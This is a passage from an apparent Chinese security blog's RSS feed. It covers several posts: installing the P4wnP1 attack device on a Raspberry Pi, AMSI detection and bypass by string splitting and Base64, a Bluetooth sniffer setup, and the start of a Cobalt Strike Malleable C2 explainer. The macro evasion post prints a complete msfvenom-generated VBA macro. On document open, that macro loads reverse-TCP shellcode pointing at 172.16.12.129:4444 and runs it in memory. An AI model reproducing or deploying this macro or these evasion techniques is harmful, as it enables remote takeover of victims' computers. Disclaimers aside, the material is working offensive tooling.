tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo su&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;../index_files/14459cab-127c-4c8f-979b-65714d21de52.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;接下来更新软件源&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apt-get update&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;../index_files/03c87010-d8da-4029-b126-bf919b223bc1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;安装相关命令&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apt-get install git john&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;完成后下载P4wnp1仓库，&#xA;可以直接去下载后通过SSH传入，也可以直接git clone命令,由于国内下载较慢，所以直接下载，在本机上开启python HTTP服务器&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python -m http.server &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;端口号&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;../index_files/758aee72-3144-405a-9721-b0a71a1bba5c.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;在树莓派内使用wget命令下载p4wnp1文件&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget http://ip:port/P4wnp1-master.zip&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;../index_files/a7647f43-4d0e-4037-a6e9-e57be74ce3ca.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;解压文件并进入对应目录，进入目录后执行安装脚本&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;unzip P4wnp1-master.zip&amp;lt;div&amp;gt;&amp;lt;br/&amp;gt;&amp;lt;/div&amp;gt;cd P4wnp1-master&amp;lt;div&amp;gt;&amp;lt;br/&amp;gt;&amp;lt;/div&amp;gt;./install.sh&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;../index_files/a883839a-86c1-47ce-950a-9e8536b64e4e.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;经过一番漫长的等待，中间会有几次卡住需要手动按回车，之后出现如下页面说明安装成功&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/744104ef-b9e3-49f0-bb42-7d69d5785988.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;记录下WiFi和SSH密码&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;WiFi name:    P4wnP1&#xD;&#xA;Key:          MaMe82-P4wnP1&#xD;&#xA;SSH access:    pi@172.24.0.1 (password: raspberry)&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;将树莓派重启后就可以使用P4wnp1了（需要插在被攻击电脑上）&lt;/p&gt;</description>
    </item>
    <item>
      <title>初窥AMSI攻防对抗</title>
      <link>http://localhost:1313/posts/asmi/</link>
      <pubDate>Sat, 21 Nov 2020 02:01:32 +0800</pubDate>
      <guid>http://localhost:1313/posts/asmi/</guid>
      <description>&lt;h2 id=&#34;什么是amsi&#34;&gt;什么是AMSI&lt;/h2&gt;&#xA;&lt;p&gt;AMSI（Antimalware Scan Interface）全称反恶意软件扫描接口，是微软提供的一个接口，官方文档地址如下：&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal&#34;&gt;https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;ASMI允许应用程序和服务与计算机上存在的任何反恶意软件产品集成。AMSI为终端用户及其数据，应用程序和工作负载提供了增强型的恶意软件防护。&lt;/p&gt;&#xA;&lt;p&gt;ASMI已集成到下列组件中：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;用户帐户控制或UAC（EXE，COM，MSI或ActiveX安装的高度）&lt;/li&gt;&#xA;&lt;li&gt;PowerShell（脚本，交互使用和动态代码评估）&lt;/li&gt;&#xA;&lt;li&gt;Windows脚本主机（wscript.exe和cscript.exe）&lt;/li&gt;&#xA;&lt;li&gt;JavaScript和VBScript&lt;/li&gt;&#xA;&lt;li&gt;Office VBA宏&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 id=&#34;amsi的工作原理&#34;&gt;AMSI的工作原理&lt;/h2&gt;&#xA;&lt;p&gt;官方给出的框架如下：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../amsi/1.png&#34; alt=&#34;AMSI体系结构&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;当ASMI打开时，其他任何程序都可以调用它，同时任何经过注册的防护软件都可以让它执行任务。&lt;/p&gt;&#xA;&lt;p&gt;在实际工作过程中，举个例子，这个例子通过异或加密，用来下载互联网上的资源，&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../amsi/2.png&#34; alt=&#34;sample script encoded in Base64&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;我们可以通过直接在PS中进行输入来确保没有通过文件执行（这可能可以绕过部分防护软件的检测）这也时我们通常说的无文件攻击，因为以这种形式产生的攻击通常驻留在内存中，常规的查杀方法难以检测。&lt;/p&gt;&#xA;&lt;p&gt;微软给出了一个例子，通过PS执行了一个脚本，被ASMI拦截&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../amsi/3.png&#34; alt=&#34;Windows Defender detecting the AMSI test sample&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;同时，AMSI还能应用到宏中，用于检测VBA和宏中是否携带有恶意操作&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../amsi/4.png&#34; alt=&#34;AMSI integration with JavaScript/VBA&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;上图经过了如下步骤：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;用户收到包含（恶意）宏的文档，该宏通过采用混淆，受密码保护的文件等技术来规避静态防病毒软件的扫描。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;然后，用户打开包含（恶意）宏的文档。如果文档在“受保护的视图”中打开，则用户单击“启用编辑”以退出“受保护的视图”。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;用户单击“启用宏”以允许宏运行。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;在运行宏时，VBA运行时使用循环缓冲区记录[1]数据和与Win32，COM和VBA API调用有关的参数。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;当观察到被认为具有高风险的特定Win32或COM API（也称为&lt;em&gt;触发器&lt;/em&gt;）[2]时，宏执行将暂停，并将循环缓冲区的内容传递给AMSI。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;注册的AMSI反恶意软件服务提供者做出判决，以指示该宏行为是否是恶意的。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;如果该行为是非恶意的，则继续执行宏。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;否则，如果该行为是恶意的，则Microsoft Office将关闭该会话以响应警报[3]，并且AV可以隔离该文件。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 id=&#34;对抗方式的进化过程&#34;&gt;对抗方式的进化过程&lt;/h2&gt;&#xA;&lt;p&gt;了解了ASMI的原理，我们可以知道它的大致工作方式，同时也知道了作用原理&lt;/p&gt;&#xA;&lt;h3 id=&#34;特定字符匹配&#34;&gt;特定字符匹配&lt;/h3&gt;&#xA;&lt;p&gt;以下为一段PS示例代码，现在是正常的代码，通常在攻防对抗的过程中会变得更为复杂：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../amsi/5.png&#34; alt=&#34;an example of a malicious PowerShell script&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;安全人员可以编写规则来检测其中的代码，例如对字符串的匹配，规则为匹配&lt;code&gt;Write-Host&#39;pwnd！&#39;&lt;/code&gt;,这时运行这段代码就会被ASMI拦截。这时候基础的对抗就应运而生，如果目标使用的是上述的全字符匹配，黑客通过拆分的方式即可绕过&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../amsi/6.png&#34; alt=&#34;an example of a dynamic script&#34;&gt;&lt;/p&gt;&#xA;&lt;h3 id=&#34;代码仿真&#34;&gt;代码仿真&lt;/h3&gt;&#xA;&lt;p&gt;这时候的简单规则被方便绕过，因此安全人员转而进行代码仿真，即执行语句的方式来判断是否有恶意行为，然而，由于拼接字符串的方法过于多样，黑客们又可以轻松绕过，例如非常常见的Base64编码，这种形式的简单加密手段在蚁剑中也很常见&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../amsi/7.png&#34; alt=&#34;an example of script content in Base64&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>宏免杀分析</title>
      <link>http://localhost:1313/posts/%E5%AE%8F%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6/</link>
      <pubDate>Wed, 04 Nov 2020 10:24:11 +0800</pubDate>
      <guid>http://localhost:1313/posts/%E5%AE%8F%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6/</guid>
      <description>&lt;p&gt;&lt;strong&gt;本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;h1 id=&#34;宏病毒攻击方式的分析与研究&#34;&gt;宏病毒攻击方式的分析与研究&lt;/h1&gt;&#xA;&lt;p&gt;在目前的APT攻防对抗中，宏病毒作为钓鱼的主要技术支撑手段，在打点过程中起到了关键性的作用，不过随着宏病毒的泛滥，各大杀软厂商也相应地采取措施进行查杀，宏免杀技术也应运而生。从早期mht只需修改后缀就能执行的方式，到现在的各种混淆，远程加载等方式，对抗手段不断更新升级。本文就来简要分析一下目前主要的攻击方式实现原理。&lt;/p&gt;&#xA;&lt;h2 id=&#34;什么是宏病毒&#34;&gt;什么是宏病毒&lt;/h2&gt;&#xA;&lt;p&gt;宏病毒是一种寄存在文档或模板的宏中的计算机病毒。一旦打开这样的文档，其中的宏就会被执行，于是宏病毒就会被激活，转移到计算机上，并驻留在Normal模板上。从此以后，所有自动保存的文档都会“感染”上这种宏病毒，而且如果其他用户打开了感染病毒的文档，宏病毒又会转移到他的计算机上。&lt;/p&gt;&#xA;&lt;h2 id=&#34;宏病毒的危害&#34;&gt;宏病毒的危害&lt;/h2&gt;&#xA;&lt;p&gt;主要是感染文档，最早期的简单宏病毒目的只是让受害者无法打开文档，无法打印文档等，不过随着对抗手段的升级，目前的宏病毒主要以控制受害者电脑，获取到shell为目的，危害极大。&lt;/p&gt;&#xA;&lt;h2 id=&#34;宏病毒的生成&#34;&gt;宏病毒的生成&lt;/h2&gt;&#xA;&lt;h3 id=&#34;msf生成宏&#34;&gt;MSF生成宏&lt;/h3&gt;&#xA;&lt;p&gt;MSF作为主流渗透测试框架，功能多样，生成宏病毒自然不在话下。MSF通过msfvenom实现，示例命令如下：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msfvenom -p windows/meterpreter/reverse_tcp lhost&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;172.16.12.129 lport&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4444&lt;/span&gt; -f vba -o msf.vba&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;宏的内容如下：&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-vbscript&#34; data-lang=&#34;vbscript&#34;&gt;#If Vba7 Then&#xD;&#xA;&#x9;Private Declare PtrSafe Function CreateThread Lib &amp;#34;kernel32&amp;#34; (ByVal Ffqss As Long, ByVal Ggwnuq As Long, ByVal Iifiex As LongPtr, Gksky As Long, ByVal Hlnyst As Long, Kmko As Long) As LongPtr&#xD;&#xA;&#x9;Private Declare PtrSafe Function VirtualAlloc Lib &amp;#34;kernel32&amp;#34; (ByVal Vnbsa As Long, ByVal Xkoptrnhw As Long, ByVal Kghlzh As Long, ByVal Lppdd As Long) As LongPtr&#xD;&#xA;&#x9;Private Declare PtrSafe Function RtlMoveMemory Lib &amp;#34;kernel32&amp;#34; (ByVal Ztmgrm As LongPtr, ByRef Dnywi As Any, ByVal Zpxn As Long) As LongPtr&#xD;&#xA;#Else&#xD;&#xA;&#x9;Private Declare Function CreateThread Lib &amp;#34;kernel32&amp;#34; (ByVal Ffqss As Long, ByVal Ggwnuq As Long, ByVal Iifiex As Long, Gksky As Long, ByVal Hlnyst As Long, Kmko As Long) As Long&#xD;&#xA;&#x9;Private Declare Function VirtualAlloc Lib &amp;#34;kernel32&amp;#34; (ByVal Vnbsa As Long, ByVal Xkoptrnhw As Long, ByVal Kghlzh As Long, ByVal Lppdd As Long) As Long&#xD;&#xA;&#x9;Private Declare Function RtlMoveMemory Lib &amp;#34;kernel32&amp;#34; (ByVal Ztmgrm As Long, ByRef Dnywi As Any, ByVal Zpxn As Long) As Long&#xD;&#xA;#EndIf&#xD;&#xA;&#xD;&#xA;Sub Auto_Open()&#xD;&#xA;&#x9;Dim Ltw As Long, Eso As Variant, Ytpg As Long&#xD;&#xA;#If Vba7 Then&#xD;&#xA;&#x9;Dim  Tpgwi As LongPtr, Ivlfxyv As LongPtr&#xD;&#xA;#Else&#xD;&#xA;&#x9;Dim  Tpgwi As Long, Ivlfxyv As Long&#xD;&#xA;#EndIf&#xD;&#xA;&#x9;Eso = Array(232,130,0,0,0,96,137,229,49,192,100,139,80,48,139,82,12,139,82,20,139,114,40,15,183,74,38,49,255,172,60,97,124,2,44,32,193,207,13,1,199,226,242,82,87,139,82,16,139,74,60,139,76,17,120,227,72,1,209,81,139,89,32,1,211,139,73,24,227,58,73,139,52,139,1,214,49,255,172,193, _&#xD;&#xA;207,13,1,199,56,224,117,246,3,125,248,59,125,36,117,228,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,95,95,90,139,18,235,141,93,104,51,50,0,0,104,119,115,50,95,84,104,76,119,38,7,137,232,255,208,184,144,1,0, _&#xD;&#xA;0,41,196,84,80,104,41,128,107,0,255,213,106,10,104,172,16,12,129,104,2,0,17,92,137,230,80,80,80,80,64,80,64,80,104,234,15,223,224,255,213,151,106,16,86,87,104,153,165,116,97,255,213,133,192,116,10,255,78,8,117,236,232,103,0,0,0,106,0,106,4,86,87,104,2,217,200,95,255,213, _&#xD;&#xA;131,248,0,126,54,139,54,106,64,104,0,16,0,0,86,106,0,104,88,164,83,229,255,213,147,83,106,0,86,83,87,104,2,217,200,95,255,213,131,248,0,125,40,88,104,0,64,0,0,106,0,80,104,11,47,15,48,255,213,87,104,117,110,77,97,255,213,94,94,255,12,36,15,133,112,255,255,255,233,155, _&#xD;&#xA;255,255,255,1,195,41,198,117,193,195,187,240,181,162,86,106,0,83,255,213)&#xD;&#xA;&#xD;&#xA;&#x9;Tpgwi = VirtualAlloc(0, UBound(Eso), &amp;amp;H1000, &amp;amp;H40)&#xD;&#xA;&#x9;For Ytpg = LBound(Eso) To UBound(Eso)&#xD;&#xA;&#x9;&#x9;Ltw = Eso(Ytpg)&#xD;&#xA;&#x9;&#x9;Ivlfxyv = RtlMoveMemory(Tpgwi + Ytpg, Ltw, 1)&#xD;&#xA;&#x9;Next Ytpg&#xD;&#xA;&#x9;Ivlfxyv = CreateThread(0, 0, Tpgwi, 0, 0, 0)&#xD;&#xA;End Sub&#xD;&#xA;Sub AutoOpen()&#xD;&#xA;&#x9;Auto_Open&#xD;&#xA;End Sub&#xD;&#xA;Sub Workbook_Open()&#xD;&#xA;&#x9;Auto_Open&#xD;&#xA;End Sub&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用msf进行监听，之后在word中运行宏即可获得shell&lt;/p&gt;</description>
    </item>
    <item>
      <title>Ubuntu下ubertooth one环境配置</title>
      <link>http://localhost:1313/posts/ubuntu%E4%B8%8Bubertooth-one%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</link>
      <pubDate>Sun, 26 Apr 2020 10:14:00 +0800</pubDate>
      <guid>http://localhost:1313/posts/ubuntu%E4%B8%8Bubertooth-one%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</guid>
      <description>&lt;p&gt;&lt;strong&gt;本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;首先安装依赖&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apt-get install cmake libusb-1.0-0-dev make gcc g++ libbluetooth-dev &lt;span style=&#34;color:#ae81ff&#34;&gt;\&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;pkg-config libpcap-dev python-numpy python-pyside python-qt4&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;../index_files/806a0f8e-e185-4c19-aff0-ebb6bdb5dd54.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;为了避免权限出现问题我在安装前直接sudo su了，这样就不用每次操作都输sudo了&#xA;然后再桌面创建一个名为ubertooth的文件夹，并赋予777权限，以便之后不通过root用户也可以执行操作&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/08efc96a-5228-4394-9d4a-e49bfcfbcf69.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;然后通过github下载libbtbb，因为某些大家都知道的原因，我这边还通过了proxychains的代理&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget https://github.com/greatscottgadgets/libbtbb/archive/2018-12-R1.tar.gz -O libbtbb-2018-12-R1.tar.gz&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;../index_files/70c480e6-c0cb-4ce8-94d5-40a059441651.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;然后执行解压命令&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tar -xf libbtbb-2018-12-R1.tar.gz&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;../index_files/c9da4945-c0b1-4c37-b5a0-f183d55aac0d.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;进入目录，创建新的文件夹build（忽略我因为手残一开始打错了），然后开始编译&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/c399754c-9919-4f20-9a03-f24894194f05.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;cmake执行完后继续执行make&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/221ac6c7-b043-47dd-8dbd-bb38aa0337c5.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;然后执行make install&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/dd78c549-ae2d-4fc2-b1a2-902c6ef8eb92.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;看起来没有任何报错，根据官方文档如果第一次安装时报错还需执行sudo ldconfig&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/bcbd0aa3-57c1-4da0-9bf6-41bdc5f26dc9.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;执行完了以后就开始安装ubertooth tools了&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/4ee1fdab-e7f3-47bb-ae38-4b8d466acc95.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget https://github.com/greatscottgadgets/ubertooth/releases/download/2018-12-R1/ubertooth-2018-12-R1.tar.xz&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;../index_files/5f98b0b9-44e2-4e6b-a3f0-7528b66fbcec.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;解压&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/c8abc573-c9e8-43c7-a813-f576011f16e9.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;之后跟着上面截图操作即可，如果报错按之前的命令执行，反正我没报错&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/9a5953ad-4850-45db-bd87-28900ac39cde.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;接下来是安装wireshark&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/7c0fc116-39f9-40fe-b861-fd2db777362e.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;先安装依赖&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apt-get install wireshark wireshark-dev libwireshark-dev cmake&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后创建目录开始编译&#xA;没有error简直完美，记得之前在ubuntu16.04里配环境各种error心态都崩了&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/2db219c9-bff7-4df9-996e-f6448c354e01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;然后重复上面的一些操作&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/283a08cd-6353-45b2-b2c6-c621de46324b.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;按着步骤执行完了轻松加愉快&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/57799ac0-e8a1-4801-a55e-030470e9ebb1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;插上我们的ubertooth&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/adc7aed8-e291-4829-b77b-da1f1667302d.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;执行以下扫描康康，从我们的HCI里读到了一些东西，也就是和主机配对过的一些东西&lt;/p&gt;</description>
    </item>
    <item>
      <title>MalleableC2详解</title>
      <link>http://localhost:1313/posts/malleablec2%E8%AF%A6%E8%A7%A3/</link>
      <pubDate>Mon, 13 Apr 2020 15:18:36 +0800</pubDate>
      <guid>http://localhost:1313/posts/malleablec2%E8%AF%A6%E8%A7%A3/</guid>
      <description>&lt;h2 id=&#34;malleable-c2和malleable-pe&#34;&gt;malleable C2和Malleable PE&lt;/h2&gt;&#xA;&lt;p&gt;malleable C2 用于规避流量检测&lt;/p&gt;&#xA;&lt;p&gt;官网链接：https://www.cobaltstrike.com/help-malleable-c2&lt;/p&gt;&#xA;&lt;p&gt;需要考虑网络环境，根据目标网络编写Malleable C2 Profile&lt;/p&gt;&#xA;&lt;p&gt;C2的配置可包含以下部分&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Profile元素&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;global OPTIONS&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;https-certificate&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;code-signer&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;http-get&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;http-post&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;http-stager&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;post-ex&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;TCP Beacon&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&amp;hellip;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;在 Malleable C2 中, 语句可分为数据转换语句, 终止语句和额外语句三种类型。&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;数据转换语句：base64 base64url mask netbios netbiosu prepend append&#xD;&#xA;终止语句： print uri-append header parameter&#xD;&#xA;额外语句： header 